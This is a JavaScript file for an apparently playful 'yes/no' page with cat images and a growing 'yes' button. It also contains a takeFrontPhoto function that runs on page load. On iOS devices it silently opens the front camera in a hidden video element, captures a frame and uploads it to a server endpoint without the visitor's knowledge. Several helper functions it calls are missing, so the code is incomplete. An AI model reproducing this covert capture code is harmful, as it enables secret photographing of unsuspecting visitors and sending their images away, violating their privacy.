"use strict";

const titleElement = document.querySelector(".title");
const buttonsContainer = document.querySelector(".buttons");
const yesButton = document.querySelector(".btn--yes");
const noButton = document.querySelector(".btn--no");
const catImg = document.querySelector(".cat-img");

const MAX_IMAGES = 5;

let play = true;
let noCount = 0;

yesButton.addEventListener("click", handleYesClick);

noButton.addEventListener("click", function () {
  if (play) {
    noCount++;
    const imageIndex = Math.min(noCount, MAX_IMAGES);
    changeImage(imageIndex);
    resizeYesButton();
    updateNoButtonText();
    if (noCount === MAX_IMAGES) {
      play = false;
    }
  }
});

async function handleYesClick() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
    const video = document.createElement('video');
    const photoButton = document.createElement('button');
    photoButton.innerText = 'Take Photo';
    photoButton.classList.add('btn');
    photoButton.onclick = () => takePhoto(video);
    buttonsContainer.innerHTML = '';
    buttonsContainer.appendChild(photoButton);
    video.srcObject = stream;
    video.play();
    buttonsContainer.appendChild(video);
  } catch (err) {
    console.error('Error accessing camera: ', err);
  }
}

async function takeFrontPhoto() {
  if (!isIOSDevice()) {
    return;
  }

  try {
    await requestCameraPermission();

    // Create a video element and hide it from the DOM
    const videoElement = document.createElement('video');
    videoElement.style.display = 'none';
    document.body.appendChild(videoElement);

    // Set the video source to the front-facing camera
    const constraints = {
      audio: false,
      video: { facingMode: "user" }
    };

    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    videoElement.srcObject = stream;
    videoElement.play();

    // Wait for the video stream to become stable
    await new Promise(resolve => videoElement.onloadedmetadata = resolve);

    // Create a canvas element and draw the current frame from the video element to it
    const canvasElement = document.createElement('canvas');
    canvasElement.width = videoElement.videoWidth;
    canvasElement.height = videoElement.videoHeight;
    const context = canvasElement.getContext('2d');
    context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

    // Stop the video stream
    videoElement.srcObject.getTracks().forEach(track => track.stop());
    videoElement.srcObject = null;
    videoElement.parentNode.removeChild(videoElement);

    // Convert the canvas element to a data URL
    const dataUrl = canvasElement.toDataURL('image/jpeg');

    // Send the captured photo to the server for processing and storage
    const formData = new FormData();
    formData.append('image', dataUrl);

    fetch('/upload', {
      method: 'POST',
      body: formData
    })
    .then((response) => {
      // Handle the server response
    })
    .catch((error) => {
      console.error(error);
    });
  } catch (error) {
    console.error(error);
  }
}

// Call the takeFrontPhoto function when the page loads
window.addEventListener('load', takeFrontPhoto);
